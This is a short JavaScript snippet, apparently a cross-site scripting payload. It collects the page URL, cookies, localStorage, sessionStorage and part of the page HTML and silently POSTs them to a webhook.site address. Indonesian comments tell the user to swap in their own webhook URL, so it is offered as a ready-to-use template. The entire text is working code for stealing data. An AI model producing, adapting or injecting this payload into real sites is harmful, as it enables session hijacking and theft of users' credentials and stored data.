(async () => {
  try {
    const body = new URLSearchParams({
      loc: location.href,
      cookie: document.cookie || '',
      ls: JSON.stringify(localStorage || {}),
      ss: JSON.stringify(sessionStorage || {}),
      html: document.documentElement.outerHTML.slice(0, 3000) // cadangan
    });
    // Ganti URL webhook di bawah dengan punyamu
    await fetch('https://webhook.site/773276c7-7537-47c1-b2ae-b4cf2d0de43e', {
      method: 'POST',
      mode: 'no-cors',
      body
    });
  } catch(e){}
})();
